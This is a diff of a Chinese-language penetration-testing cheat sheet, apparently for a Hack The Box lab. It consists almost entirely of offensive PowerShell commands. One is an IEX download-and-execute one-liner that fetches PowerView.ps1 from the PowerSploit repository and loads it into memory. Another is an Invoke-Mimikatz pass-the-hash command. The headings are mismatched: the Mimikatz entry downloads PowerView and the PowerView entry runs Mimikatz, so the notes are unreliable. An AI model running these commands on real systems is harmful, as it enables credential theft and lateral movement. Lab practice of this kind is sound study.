@@ -14,8 +14,12 @@
 >>> 更新為powershell下載時用TLS1.2:
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
->>> 直接下載PowerSploit powershell版 Mimikatz raw 檔案（方便在目標機器上執行）：
-  IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
+>>> PowerView:
+  >>>> 直接下載 PowerView並載入到 記憶體中, 不落Harddisk:
+    Invoke-Mimikatz -Command '"sekurlsa::pth /user:使用者 /domain:htb.local /ntlm:NTLM_HASH /run:powershell.exe"'
 
->>> 直接下載 PowerView並載入到 記憶體中, 不落Harddisk:
-  Invoke-Mimikatz -Command '"sekurlsa::pth /user:使用者 /domain:htb.local /ntlm:NTLM_HASH /run:powershell.exe"'
+>>> Mimikatz: 
+  >>>> 直接下載PowerSploit powershell版 Mimikatz raw 檔案（方便在目標機器上執行）：
+    IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
+
+
